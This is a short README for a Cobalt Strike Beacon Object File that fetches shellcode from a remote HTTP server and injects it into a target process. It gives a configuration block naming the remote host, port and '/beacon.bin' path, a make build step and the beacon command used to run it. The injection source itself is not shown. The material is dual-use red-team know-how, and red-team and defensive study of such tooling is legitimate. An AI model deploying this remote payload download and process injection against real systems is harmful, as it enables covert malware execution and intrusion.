# Inject-http BOF
A custom `inject` function of Cobalt Strike, which injects the shellcode in a process by retrieving the shellcode from a remote HTTP server.

## Usage  

Make sure to change the values on `inject-http.c` (line 59):  

```
    //--------- CONFIGURE -----------
    LPCWSTR remotehost = L"192.168.0.x"; //change to your IP
    int remoteport = 8081; //change to your port
    LPCWSTR remotedir = L"/beacon.bin"; //change to your directory of the hosted bin file
    //-------------------------------
```

Compile the script using `make`.  
```
make
```

Then load `inject-http.cna` to Cobalt Strike. To run the BOF inside a Beacon:  
```
beacon> inject-http <pid>
```

## Demo  

![wmi_in_action](https://github.com/kleiton0x00/RemoteShellcodeExec/assets/37262788/abc3b752-647f-4262-8fab-cedf631d4dda)
